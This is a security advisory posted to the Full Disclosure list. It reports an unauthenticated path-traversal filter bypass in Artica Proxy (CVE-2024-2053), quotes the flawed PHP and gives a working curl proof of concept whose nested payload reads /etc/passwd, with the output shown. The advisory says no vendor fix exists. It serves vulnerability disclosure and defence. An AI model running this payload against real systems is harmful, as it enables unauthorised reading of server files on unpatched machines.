<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="KL-001-2024-001: Artica Proxy Unauthenticated LFI Protection Bypass Vulnerability"/>
<meta name="Author" content="KoreLogic Disclosures via Fulldisclosure"/>
<title>Full Disclosure: KL-001-2024-001: Artica Proxy Unauthenticated LFI Protection Bypass Vulnerability</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="10"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#11">By Date</a>
<a href="12"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="10"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#11">By Thread</a>
<a href="12"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">KL-001-2024-001: Artica Proxy Unauthenticated LFI Protection Bypass Vulnerability</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: KoreLogic Disclosures via Fulldisclosure &lt;fulldisclosure () seclists org&gt;<br>

<em>Date</em>: Tue, 5 Mar 2024 12:29:00 -0600<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">
KL-001-2024-001: Artica Proxy Unauthenticated LFI Protection Bypass Vulnerability

Title: Artica Proxy Unauthenticated LFI Protection Bypass Vulnerability
Advisory ID: KL-001-2024-001
Publication Date: 2024.03.05
Publication URL: <a  rel="nofollow" href="https://korelogic.com/Resources/Advisories/KL-001-2024-001.txt">https://korelogic.com/Resources/Advisories/KL-001-2024-001.txt</a>


1. Vulnerability Details

     Affected Vendor: Artica
     Affected Product: Artica Proxy
     Affected Version: 4.40 and 4.50
     Platform: Debian 10 LTS
     CWE Classification: CWE-23: Relative Path Traversal
     CVE ID: CVE-2024-2053


2. Vulnerability Description

     The Artica Proxy administrative web application attempts to
     prevent local file inclusion. These protections can be bypassed
     and arbitrary file requests supplied by unauthenticated
     users will be returned according to the privileges of the
     &quot;www-data&quot; user.


3. Technical Description

     Prior to authentication, a user can send an HTTP request to
     the &quot;images.listener.php&quot; endpoint. This endpoint processes
     the &quot;mailattach&quot; query parameter and concatonates the user
     supplied value to the &quot;/opt/artica/share/www/attachments/&quot;
     file path. The contents of the file located at the newly
     created path is returned in the HTTP response body.

     The &quot;images.listener.php&quot; endpoint attempts to prevent
     a local file inclusion vulnerability by stripping strings
     that attempt to traverse into the parent directory from
     the user supplied &quot;mailattach&quot; value:

$_GET[&quot;mailattach&quot;]=str_replace(&quot;////&quot;,&quot;/&quot;,$_GET[&quot;mailattach&quot;]);
$_GET[&quot;mailattach&quot;]=str_replace(&quot;///&quot;,&quot;/&quot;,$_GET[&quot;mailattach&quot;]);
$_GET[&quot;mailattach&quot;]=str_replace(&quot;//&quot;,&quot;/&quot;,$_GET[&quot;mailattach&quot;]);
$_GET[&quot;mailattach&quot;]=str_replace(&quot;../&quot;,&quot;&quot;,$_GET[&quot;mailattach&quot;]);
$_GET[&quot;mailattach&quot;]=str_replace(&quot;/etc/&quot;,&quot;&quot;,$_GET[&quot;mailattach&quot;]);
$_GET[&quot;mailattach&quot;]=str_replace(&quot;passwd&quot;,&quot;&quot;,$_GET[&quot;mailattach&quot;]);
$file=&quot;/opt/artica/share/www/attachments/{$_GET[&quot;mailattach&quot;]}&quot;;
       header(&quot;Content-type: application/force-download&quot; );
       header(&quot;Content-Disposition: attachment; \
               filename=\&quot;{$_GET[&quot;mailattach&quot;]}\&quot;&quot;);
       header(&quot;Content-Length: &quot;.filesize($file).&quot;&quot; );
       header(&quot;Expires: 0&quot; );
       readfile($file);

     If effective, this approach would limit files
     accessible by this endpoint to those within the
     &quot;/opt/artica/share/www/attachments/&quot; directory. Unfortunately,
     the removal of the &quot;../&quot; string is only performed once, so
     the resulting file path is not checked.  By using the path
     &quot;..././foo.txt&quot;, the &quot;images.listener.php&quot; endpoint removes the
     &quot;../&quot; string resulting in &quot;../foo.txt&quot; - a relative file path
     to traverse to the parent directory.

     The strings &quot;/etc/&quot; and &quot;passwd&quot; are also stripped from the file
     path as many methods of detecting a path traversal vulnerability
     rely on fetching the &quot;/etc/passwd&quot; file. By inserting these
     strings into specific locations, a user suppplied &quot;mailattach&quot;
     value such as &quot;/epasswdtc/ppasswdasswd&quot; is transformed into
     &quot;/etc/passwd&quot;, bypassing the protection entirely.

     An unauthenticated user can leverage this endpoint to read
     files on the system, according to the privileges of the
     &quot;www-data&quot; user.


4. Mitigation and Remediation Recommendation

     No response from vendor; no remediation available.


5. Credit

     This vulnerability was discovered by Jaggar Henry of KoreLogic,
     Inc.


6. Disclosure Timeline

     2023.12.18 - KoreLogic requests vulnerability contact and
                  secure communication method from Artica.
     2023.12.18 - Artica Support issues automated ticket #1703011342
                  promising follow-up from a human.
     2024.01.10 - KoreLogic again requests vulnerability contact and
                  secure communication method from Artica.
     2024.01.10 - KoreLogic mail daemon receives SMTP 554 5.7.1 from
                  mail.articatech.com with response
                  &quot;Client host rejected: Go Away!&quot;
     2024.01.11 - KoreLogic requests vulnerability contact and
                  secure communication method via
                  <a  rel="nofollow" href="https://www.articatech.com/">https://www.articatech.com/</a> &apos;Contact Us&apos; web form.
     2024.01.23 - KoreLogic requests CVE from MITRE.
     2024.01.23 - MITRE issues automated ticket #1591692 promising
                  follow-up from a human.
     2024.02.01 - 30 business days have elapsed since KoreLogic
                  attempted to contact the vendor.
     2024.02.06 - KoreLogic requests update on CVE from MITRE.
     2024.02.15 - KoreLogic requests update on CVE from MITRE.
     2024.02.22 - KoreLogic reaches out to alternate CNA for
                  CVE identifiers.
     2024.02.26 - 45 business days have elapsed since KoreLogic
                  attempted to contact the vendor.
     2024.02.29 - Vulnerability details presented to AHA!
                  (takeonme.org) by proxy.
     2024.03.01 - AHA! issues CVE-2024-2053 to track this
                  vulnerability.
     2024.03.05 - KoreLogic public disclosure.


7. Proof of Concept

</pre><tt>     $ curl -k 
</tt><tt>&apos;<a  rel="nofollow" href="https://192.168.2.129:9000/images.listener.php?uri=1&amp;mailattach=..././..././..././..././..././epasswdtc/ppasswdasswd&apos">https://192.168.2.129:9000/images.listener.php?uri=1&amp;mailattach=..././..././..././..././..././epasswdtc/ppasswdasswd&apos</a>;
</tt><pre style="margin: 0em;">
     root:x:0:0:root:/root:/bin/bash
     daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
     bin:x:2:2:bin:/bin:/usr/sbin/nologin
     sys:x:3:3:sys:/dev:/usr/sbin/nologin
     sync:x:4:65534:sync:/bin:/bin/sync
     games:x:5:60:games:/usr/games:/usr/sbin/nologin
     man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
     lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
     mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
     <a  rel="nofollow" href="news:x:9:9:news:/var/spool/news:/usr/sbin/nologin">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</a>
     uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
     proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
     www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
     backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
     list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
     irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
     gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
     nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
     _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
     systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
     systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
     systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
     messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
     mysql:x:105:112:MySQL Server,,,:/nonexistent:/bin/false
     quagga:x:106:114:Quagga routing suite,,,:/run/quagga/:/usr/sbin/nologin
     apt-mirror:x:107:115::/var/spool/apt-mirror:/bin/sh
     privoxy:x:108:65534::/etc/privoxy:/usr/sbin/nologin
     ntp:x:109:117::/nonexistent:/usr/sbin/nologin
     redsocks:x:110:118::/var/run/redsocks:/usr/sbin/nologin
     prads:x:111:120::/home/prads:/usr/sbin/nologin
     freerad:x:112:121::/etc/freeradius:/usr/sbin/nologin
     vnstat:x:113:122:vnstat daemon,,,:/var/lib/vnstat:/usr/sbin/nologin
     stunnel4:x:114:123::/var/run/stunnel4:/usr/sbin/nologin
     sshd:x:115:65534::/run/sshd:/usr/sbin/nologin
     vde2-net:x:116:124::/var/run/vde2:/usr/sbin/nologin
     memcache:x:117:125:Memcached,,,:/nonexistent:/bin/false
     davfs2:x:118:126::/var/cache/davfs2:/usr/sbin/nologin
     ziproxy:x:119:127::/var/run/ziproxy:/usr/sbin/nologin
     proftpd:x:120:65534::/run/proftpd:/usr/sbin/nologin
     ftp:x:121:65534::/srv/ftp:/usr/sbin/nologin
     mosquitto:x:122:128::/var/lib/mosquitto:/usr/sbin/nologin
     openldap:x:123:129:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
     munin:x:124:130:munin application user,,,:/var/lib/munin:/usr/sbin/nologin
     msmtp:x:125:131::/var/lib/msmtp:/usr/sbin/nologin
     Debian-snmp:x:126:132::/var/lib/snmp:/bin/false
     opendkim:x:127:133::/var/run/opendkim:/usr/sbin/nologin
     avahi:x:128:134:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
     glances:x:129:135::/var/lib/glances:/usr/sbin/nologin
ArticaStats:x:1000:1000:ArticaStats:/home/ArticaStats:/bin/bash
     Debian-exim:x:130:138::/var/spool/exim4:/usr/sbin/nologin
     smokeping:x:131:139:SmokePing daemon,,,:/var/lib/smokeping:/usr/sbin/nologin
     debian-spamd:x:132:140::/var/lib/spamassassin:/bin/sh
     netdata:x:1001:1002:netdata:/home/netdata:/bin/bash
     postfix:x:1002:1001::/home/postfix:/bin/sh
     ...
     ...


The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
<a  rel="nofollow" href="http://creativecommons.org/licenses/by-sa/4.0/">http://creativecommons.org/licenses/by-sa/4.0/</a>

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
<a  rel="nofollow" href="https://www.korelogic.com/about-korelogic.html">https://www.korelogic.com/about-korelogic.html</a>

Our public vulnerability disclosure policy is available at:
<a  rel="nofollow" href="https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.3.txt">https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.3.txt</a>

</pre><p><strong>Attachment:
<a href="att-11/OpenPGP_signature_asc.bin" ><tt>OpenPGP_signature.asc</tt></a></strong><br>
<em>Description:</em> OpenPGP digital signature</p>
<pre style="margin: 0em;">_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="https://seclists.org/fulldisclosure/">https://seclists.org/fulldisclosure/</a></pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="10"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#11">By Date</a>
<a href="12"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="10"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#11">By Thread</a>
<a href="12"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>KL-001-2024-001: Artica Proxy Unauthenticated LFI Protection Bypass Vulnerability</strong> <em>KoreLogic Disclosures via Fulldisclosure (Mar 05)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

